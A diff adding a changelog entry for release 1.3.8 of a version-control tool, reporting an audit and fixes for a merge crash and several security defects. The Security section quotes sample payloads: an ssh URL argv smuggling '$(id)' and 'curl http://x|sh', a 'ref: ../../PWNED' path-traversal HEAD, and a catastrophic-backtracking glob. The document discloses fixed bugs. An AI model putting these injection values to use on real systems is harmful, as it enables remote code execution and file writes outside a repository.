@@ -4,6 +4,130 @@ Format: [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 
 ## [Unreleased]
 
+## [1.3.8] — 2026-08-18 — deep audit: `sit merge` crashed on an ordinary merge, plus 14 more fixes
+
+A second, much wider audit pass run immediately after 1.3.7: **10 independent
+auditors** across every module, **every** finding put through three adversarial
+verifiers with a majority-refute kill rule, then a completeness critic. 36
+candidates, 29 survived verification, ~26 unique after de-duplication. Full
+report: [`docs/audit/2026-08-18-audit.md`](docs/audit/2026-08-18-audit.md).
+
+**The worst defect in this release is not a security bug.** `sit merge`
+SIGSEGV'd when one side appended a line and the other prepended one — an
+everyday merge, no hostile input, no attacker — and on the paths that survived
+it silently dropped one side's edits. **Anyone merging two branches could hit
+this.** It is the first entry below for that reason.
+
+No public-API change, but the fixes reach `[lib]` and `[lib.read]`, so **owl and
+thoth inherit them and should be rebuilt.**
+
+### Fixed — correctness
+
+- **CRITICAL — `sit merge` crashed, or lost edits, on an insert-only hunk.**
+  `three_way_line_merge` (`src/merge.cyr`) took a hunk's `base_end`
+  unconditionally. A hunk that only *inserts* has `base_start == base_end`, so
+  that assigned the walk cursor to itself; `hunk_starting_at` re-found the same
+  hunk and re-appended its lines forever, past the output allocation —
+  `append_line_to_buf` had no capacity argument at all. Reproduced with
+  base `a,b` / ours `a,b,X1` / theirs `Z0,a,b` → **SIGSEGV**.
+
+  Fixed by taking `base_end` only when the hunk actually consumes base lines (a
+  pure insert emits its lines and leaves the cursor, which is the correct
+  "insert before line b" semantics), and by giving `append_line_to_buf` a
+  capacity so any future sizing miscount degrades to a conflict instead of
+  smashing the heap. Both sides' hunks at one position are now applied rather
+  than the second being dropped: the merge above now yields `Z0 a b X1`,
+  matching git.
+
+### Security
+
+- **HIGH — `ssh://` argument and remote-command injection.** `_ssh_parse_url`'s
+  header comment promised byte-whitelisting via `url_authority_path_valid`; it
+  **never called it**, and `fetch`/`push` read the URL straight from
+  `.sit/config` with only a scheme check, bypassing `remote_url_valid` entirely.
+  Captured from the pre-fix build: argv
+  `[-T] [--] [user@evil$(id)] [sit] [serve] [/repo;curl http://x|sh] [--stdio]`.
+  OpenSSH joins the trailing argv into one string for the remote **login shell**
+  (remote code execution on a legitimate server), and percent-expands the
+  hostname into `ProxyCommand`/`LocalCommand` via `/bin/sh` (CVE-2023-51385
+  class). Now whitelisted on all three components, with `%` additionally
+  rejected in user/host.
+- **HIGH — HEAD symref path traversal → arbitrary file write.**
+  `read_head_ref_path()` returned the raw bytes after `ref: ` unvalidated, and
+  `write_head_ref`/`reflog_head_move` concatenate that onto `.sit/` to build
+  **write** paths. Verified: `.sit/HEAD` = `ref: ../../PWNED` made `sit commit`
+  write 65 bytes outside the repository; `refs/heads/../../..` also passes
+  `reflog_head_move`'s prefix test, appending reflog lines (carrying the commit
+  message) to that path. Reachable from any repo whose `.sit/` came from outside.
+  Now gated with `refname_valid` at the choke point, matching git's
+  `check_refname_format()` on the referent.
+- **HIGH — `serve --stdio` dispatched on a body it never received.** `req_end`
+  was the client's *claimed* `Content-Length`, so every POST handler's
+  completeness check became the tautology `X > X`; `serve_handle_put_object`
+  then inflated up to 16 MiB over a 64 KiB buffer. Now bounded and refused when
+  the claimed length exceeds the bytes read.
+- **HIGH — remote `Content-Length` overflow (http + ssh clients).** With a value
+  near i64 max, `body_off + clen` wraps negative and the framing test passes
+  instantly, returning a "complete" response whose body was never read. New
+  shared `content_length_sane()` applied at every site.
+- **HIGH — `_wildmatch` catastrophic backtracking.** An **18-byte** ignore file
+  (`*a*a*a*a*a*a*a*a*b`) plus a 64-char filename pinned a core indefinitely —
+  `sit status` past a 15 s timeout at 100% CPU. Same matcher serves `.gitignore`
+  on the owl/thoth read path. Bounded by a per-match step budget; exhaustion
+  returns "no match", the safe direction (file reported, not hidden). 15 s → 4 ms.
+  ⚠ This bounds the resource; the matcher is still worst-case exponential.
+  Memoization is the proper fix and is on the roadmap — it was not taken here
+  because the memo table would be allocated per (pattern, path) pair on a
+  benchmarked hot path.
+- **HIGH — `config_file_set` heap overflow.** Sized for **one** occurrence of the
+  key while rewriting **every** matching line: 2000 duplicates + a 1000-byte
+  value wrote **2,010,007 bytes into a 9,016-byte allocation**, exiting 0. Now
+  counts matches first.
+- **HIGH — four unbounded walks.** A crafted commit timestamp spun `iso8601`'s
+  year-at-a-time stdlib walk for hours (clamped to the formatter's real domain,
+  9999-12-31); `cmd_log`'s parent walk had no cycle bound (sit doesn't re-verify
+  object hashes on read, so a hand-authored store can name itself parent);
+  `flatten_tree` capped depth but not **node count** (Nᵏ expansion from a few
+  hundred KB); and the worktree walk descended symlinks, recursing to the
+  kernel's 40-deep `ELOOP` cap — now treated as leaves, which is also git's
+  semantics.
+- **MEDIUM — unvalidated object ids reached a SQL literal.** `read_object`
+  memcpy'd 64 bytes verbatim into a patra string literal with no gate, from a
+  dozen call sites; the unconditional copy also made a short string an OOB read.
+  Gated at the choke point, covering every caller.
+- **MEDIUM — `.git/config` hash-algo detection was an unanchored substring scan**
+  for `sha256`, on the stated assumption that "the token appears nowhere else in
+  a normal config". Any occurrence — remote URL, branch or **submodule name** —
+  flipped a SHA-1 repo into 64-hex mode. The failure is silent and fails *open*
+  at the reporting layer: `sit_repo_open` still returns 1 and the branch name is
+  still right, but `sit_repo_status` reports a clean tree as **all files
+  untracked**. Attacker-reachable: a submodule name from the attacker's
+  `.gitmodules` is copied into the superproject's config by `git submodule
+  update --init`. Now anchored to the `objectFormat` key.
+- **MEDIUM — `tag -d` / `branch -d` skipped the `refname_valid` their create
+  paths apply**, so the unlink target could escape `.sit/refs/`. **MEDIUM —
+  `cmd_checkout`** read a ref without the S-11 hex gate.
+
+### Added
+
+- **`tests/integration/run.sh` scenario 11** — six S-25 regression assertions,
+  proven non-vacuous against a 1.3.7 binary: the merge case fails there with
+  **SIGSEGV 139** and with a lost edit, the glob case with **timeout 124**, the
+  HEAD case by writing outside the repo, the symlink case by descending.
+  ⚠ The config assertion passes on both builds — that overflow is silent
+  adjacent-heap corruption with no shell-observable symptom, so it guards the
+  functional round-trip, not the overflow.
+
+### Deferred
+
+Every CRITICAL and HIGH is fixed, plus four MEDIUMs. **Ten confirmed MEDIUM/LOW
+findings are deliberately not fixed here** and are named individually in the
+audit report and on the roadmap — none is a memory-safety defect. They include
+`fsck --prune-now` vs silently-dropped tree entries, `sit_repo_branch` returning
+unsanitized bytes to consumers, the wire commit-chain allocation cap, and
+`lcs_diff`'s guard ordering (which refuses to diff any add/delete of a
+>8192-line file).
+
 ## [1.3.7] — 2026-08-17 — hardening pass: two memory-safety defects in the git packfile reader
 
 A full P(-1) audit / refactor / hardening pass over the whole tree. **The
